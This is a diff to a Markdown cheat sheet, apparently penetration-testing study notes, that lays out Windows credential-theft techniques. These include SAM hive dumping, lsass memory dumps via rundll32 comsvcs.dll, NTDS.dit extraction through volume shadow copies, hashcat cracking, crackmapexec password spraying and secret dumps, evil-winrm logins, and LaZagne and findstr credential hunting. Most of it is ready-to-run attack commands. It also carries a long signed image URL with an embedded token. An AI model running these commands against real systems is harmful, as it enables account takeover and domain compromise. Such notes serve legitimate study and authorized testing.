@@ -1,9 +1,11 @@
 ### Content
 - [Transfer Files Technique](#transfer-files-technique)
 - [Hash Crack Technique](#hash-crack-technique)
+- [Checking Privileges](#checking-privileges)
 - [SAM Attacks](#sam-attacks)
 - [LSASS Attacks](#lsass-attacks)
-- [Active Directory & NTDS.dit Attacks](#active-directory-&-ntds.dit-attacks)
+- [NTDS.dit Attacks](#ntds.dit-attacks)
+- [Credential Hunting](#credential-hunting)
 ---
 ##### Transfer Files Technique
 Transfer files from the target to the attacker machine using [Impacket's smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py).
@@ -18,18 +20,26 @@ Transfer files from the target to the attacker machine using [Impacket's smbserv
 ---
 ##### Hash Crack Technique
 Crack hashes with hashcat. [supported hash types](https://hashcat.net/wiki/doku.php?id=example_hashes)
-1. Add NT hashes into text file with each hash in a single line without any additions.
-2. Run hashcat against the NT hashes.
-	``` bash
-	sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
-	```
+
+``` bash
+# Crack list of hashes
+sudo hashcat -m 1000 hashestocrack.txt <wordlist>
+# Crack one hash directly
+sudo hashcat -m 1000 <hash> <wordlist>
+```
+---
+##### Checking Privileges
+- Check local priv using `net localgroup`.
+- Check domain priv using `net user <UserName>`.
 ---
 ## SAM Attacks
+
 Dumping the local SAM database from a compromised host. (**Local admin privileges required**)
-- Three registry hives required:
-	- `hklm\sam` Contains the hashes associated with local account passwords.
-	- `hklm\system` Contains the system bootkey, which is used to encrypt the SAM database.
-	- `hklm\security` Contains cached credentials for domain accounts.
+Three registry hives required to dump the SAM secrets:
+- `hklm\sam` Contains the hashes associated with local account passwords.
+- `hklm\system` Contains the system bootkey, which is used to encrypt the SAM database.
+- `hklm\security` Contains cached credentials for domain accounts.
+
 - Save the required hives:
 	``` PowerShell
 	C:\WINDOWS\system32> reg.exe save hklm\sam C:\Windows\Temp\sam.save  
@@ -51,14 +61,16 @@ Dumping the local SAM database from a compromised host. (**Local admin privilege
 ## LSASS Attacks
 Pulling hashes from memory by dumping the `lsass.exe` process memory.
 - In case we have UI access, dump the process memory using the task manager. `lsass.DMP` file created in `C:\Users\loggedonusersdirectory\AppData\Local\Temp`
+<img src="https://academy.hackthebox.com/storage/modules/147/taskmanagerdump.png" style="width:50%;height:50%">
 
-<img src="https://private-user-images.githubusercontent.com/115187674/394169491-6912e7fd-d4d8-4790-81d4-f6927060a68c.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzM4MTYxNTMsIm5iZiI6MTczMzgxNTg1MywicGF0aCI6Ii8xMTUxODc2NzQvMzk0MTY5NDkxLTY5MTJlN2ZkLWQ0ZDgtNDc5MC04MWQ0LWY2OTI3MDYwYTY4Yy5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjQxMjEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI0MTIxMFQwNzMwNTNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1iZTM3ZTQ5NDFjYjU4ZWM4NDRjMTdmNmZhNThkNmRiNDJjNTI2NzRhMjU2NGNlZjk5NjAxNzM1NzI5NDg4MjI0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.My2LUJTdvLPIvItX8iuo6loG0BIVgQtRxY0R6h_QhKw">
-
-- In case we have only command-line access, use [Rundll32.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32) & Comsvcs.dll.
-	- Find the process PID with `tasklist | findstr lsass.exe`
-	``` PowerShell
-	rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\lsass.dmp full
-	```
+- In case of using command-line:
+	- get the PID
+		- CMD `tasklist | findstr lsass.exe`
+		- PowerShell `Get-Process lsass`
+	- then use [Rundll32.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32) & Comsvcs.dll to dump the process.
+		``` PowerShell
+		rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\lsass.dmp full
+		```
 - Use [Transfer Files Technique](#transfer-files-technique) mentioned above to transfer the process dump.
 - Use [Pypykatz](https://github.com/skelsec/pypykatz/blob/main/pypykatz/pypykatz.py) to extract hashes.
 	``` bash
@@ -71,22 +83,22 @@ Pulling hashes from memory by dumping the `lsass.exe` process memory.
 > `crackmapexec smb <IP> --local-auth -u <Username> -p <Password> --lsa`
 
 ---
-## Active Directory & NTDS.dit Attacks
+## NTDS.dit Attacks
 Extracting hashes from the NTDS database (ntds.dit) on a **Domain Controller**.
-- Lunch Dictionary Attack against AD account to discover working credentials using crackmapexec.
+
+- Lunch Dictionary Attack if an account lockout policy is not enforced.
 	``` bash
 	crackmapexec smb <IP> -u <UserName_wordlist> -p /usr/share/wordlists/fasttrack.txt
 	```
-- Login to the system using `evil-winrm` with the creds we captured from above
+- If the dictionary attack worked and we got a DC creds, login to the DC system using `evil-winrm`.
 	``` bash
-	evil-winrm -i <IP>  -u <UserName> -p '<Password>'
+	evil-winrm -i <IP> -u <UserName> -p '<Password>'
 	```
 
-- With access to a domain controller’s file system attacker should exfiltrate:
+- With access to a DC, to dump secrets from NTDS.dit, attacker should exfiltrate:
 	- `C:\Windows\NTDS\NTDS.dit`
 	- `HKEY_LOCAL_MACHINE\SYSTEM` registry hive, which is required to obtain the `Boot Key` for decrypting `ntds.dit`.
-
-- Attacker needs local admin or Domain Admin privilege, check local priv using `net localgroup` and domain priv using `net user <UserName>`.
+- Local admin or domain Admin privilege **required**
 - We can't copy the ntds.dit directly as it's always being used by the domain controller, So we will create a shadow copy for the entire drive.
 
 - Use vssadmin to create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (VSS).
@@ -123,3 +135,21 @@ Extracting hashes from the NTDS database (ntds.dit) on a **Domain Controller**.
 > [!Note]
 > CrackMapExec can accomplish the same steps shown above, all with one command.
 > `crackmapexec smb <IP> -u <UserName> -p <Password> --ntds`
+
+---
+## Credential Hunting
+
+Once we have access to a target, we can hunt stored credentials stored on it.
+- Key Terms to Search: Passwords, Passphrases, Keys, Username, User account, Creds, Users, Passkeys, Passphrases, configuration, dbcredential, dbpassword, pwd, Login, Credentials. using findstr:
+	``` Powershell
+	findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+	```
+- We can transfer [Lazagne](https://github.com/AlessandroZ/LaZagne/releases/) to the target host, using the [Transfer Files Technique](#transfer-files-technique) discussed above then run it with the next command
+	``` CMD
+	C:\> start lazagne.exe all
+	```
+- Other places we should keep in mind when credential hunting:
+	- Group Policy and scripts in the SYSVOL share.
+	- Look at IT shares.
+	- Passwords in the AD user or computer description fields.
+---
